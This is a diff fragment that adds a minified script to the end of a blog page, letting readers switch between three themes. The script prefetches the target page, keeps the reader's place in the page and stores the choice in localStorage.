+<script>(function(){var T={"butterfly":"/","claude":"/claude/","loaf":"/loaf/"},here="claude",root=T[here],p=location.pathname;var rel=p.indexOf(root)===0?p.slice(root.length):"";for(var k in T){if(k!==here&&T[k].length>root.length&&p.indexOf(T[k])===0)rel=""}var links=document.querySelectorAll("a[data-switch]");function place(){if(scrollY<200)return"";var h=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]"),id="";for(var i=0;i<h.length;i++){if(h[i].getBoundingClientRect().top<160)id=h[i].id;else break}return id?"#"+encodeURIComponent(id):""}function url(a){return T[a.dataset.switch]+rel+"?theme="+a.dataset.switch}function warm(a){if(a.dataset.warm)return;a.dataset.warm=1;var l=document.createElement("link");l.rel="prefetch";l.href=url(a);document.head.appendChild(l)}links.forEach(function(a){a.href=url(a);a.addEventListener("pointerenter",function(){warm(a)});a.addEventListener("focus",function(){warm(a)});a.addEventListener("touchstart",function(){warm(a)},{passive:true});a.addEventListener("click",function(){try{localStorage.setItem("blog-theme",a.dataset.switch)}catch(e){}var st=document.createElement("style");st.textContent="@view-transition{navigation:auto}";document.head.appendChild(st);a.href=url(a)+place()})});document.querySelectorAll("details.tsw").forEach(function(d){d.addEventListener("toggle",function(){if(d.open)links.forEach(warm)});document.addEventListener("click",function(e){if(d.open&&!d.contains(e.target))d.open=false});document.addEventListener("keydown",function(e){if(e.key==="Escape")d.open=false})});})()</script></body>
+</html>
